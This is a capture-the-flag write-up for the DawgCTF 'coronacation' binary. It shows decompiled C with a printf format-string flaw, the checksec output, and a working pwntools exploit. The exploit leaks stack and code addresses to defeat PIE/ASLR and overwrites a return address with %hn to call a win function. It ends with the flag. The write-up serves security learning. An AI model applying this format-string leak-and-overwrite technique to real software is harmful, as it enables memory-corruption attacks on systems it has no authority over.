NOTE: To solve this challenge i worked with my teammate Enrico. He wrote the
exploit (python 2) first and got the flag.  
In my writeup i put an optimized exploit for python 3.

Play game:  
```c  
__int64 play_game()  
{  
 __int64 result; // rax  
 char s; // [rsp+0h] [rbp-40h]

 puts("Welcome to this choose your own adventure game!");  
 puts("You're President Ronald Drump and are tasked with leading the nation
through this crisis.");  
 puts("So what do you want to do?");  
 puts("1. Close the borders.");  
 puts("2. Tell everyone not to panic. It's just the Fake News media freaking
out.");  
 fgets(&s, 50, _bss_start);  
 printf("You chose: ", 50LL);  
 printf(&s);  
 if ( s == 49 )  
   return close_borders();  
 result = 50 - (unsigned int)(unsigned __int8)s;  
 if ( s == 50 )  
   result = no_panic();  
 return result;  
}  
```  
`Close borders` and `no panic` functions contains the same instruction, i used
close borders.

Close borders:  
```c  
__int64 close_borders()  
{  
 __int64 result; // rax  
 char s; // [rsp+0h] [rbp-40h]

 puts("\nSo we closed our borders. Weren't we doing that anyway with the
wall?");  
 puts("It's still spreading within our borders what do we do now?");  
 puts("1. Reassure everyone the country can handle this. Our healthcare system
is the best. Just the greatest.");  
 puts("2. Make it a national emergency. Show the people we don't need Bernie's
healthcare plan.");  
 fgets(&s, 50, _bss_start);  
 printf("You chose: ", 50LL);  
 printf(&s);  
 if ( s == 49 )  
   return lose3();  
 result = 50 - (unsigned int)(unsigned __int8)s;  
 if ( s == 50 )  
   result = lose4();  
 return result;  
}  
```

Checksec:  
```shell  
[*] '/home/marco/Desktop/umbccd/coronacation/coronacation'  
   Arch:     amd64-64-little  
   RELRO:    Full RELRO  
   Stack:    No canary found  
   NX:       NX enabled  
   PIE:      PIE enabled  
```

In order to call win function, we need two memory leak to bypass PIE / ASLR.  
We used te first format string (play game function) to leak the rbp (stack
section leak) and return address(.text section address).  
Then with the second format string (in `close_border`), we overwrite the
return address with win address.

Exploit:  
```python  
from pwn import *

#p = remote('ctf.umbccd.io', 4300)  
p = process('./coronacation')  
print(p.recvuntil('out.\n').decode())  
payload = (('1 ').encode())  
payload += (('%14$p %15$p').encode())  
p.sendline(payload)  
print(p.recvuntil('chose: 1 ').decode())

stm = p.recvuntil('\n').decode()  
rbp = int(stm.replace('\n', "").split(' ')[0], 16)  
ret_stack = rbp-0x8  
ret = int(stm.replace('\n', "").split(' ')[1], 16)

win = ret-0x31f  
towrite = win & 0xffff  
print('to write: ', (towrite))  
print('Leaked base pointer: ', hex(rbp), 'stack address return pointer: ',
hex(ret_stack))  
print('leaked return address: ', hex(ret), ' win function at: ', hex(win))  
print(p.recvuntil('plan.').decode())

padding = '0'*(8-len(str(towrite))) + str(towrite)

payload2 = ("%" + padding + "lx%8$hn").encode()  
payload2 += p64(ret_stack)  
print(payload2)  
p.sendline(payload2)  
print(p.recvuntil('}'))

```

# FLAG  
`DawgCTF{st@y_Th3_f@ck_h0m3}`  

Original writeup
(https://github.com/Internaut401/CTF_Writeup/blob/master/2020/DawgCTF/coroncation.md).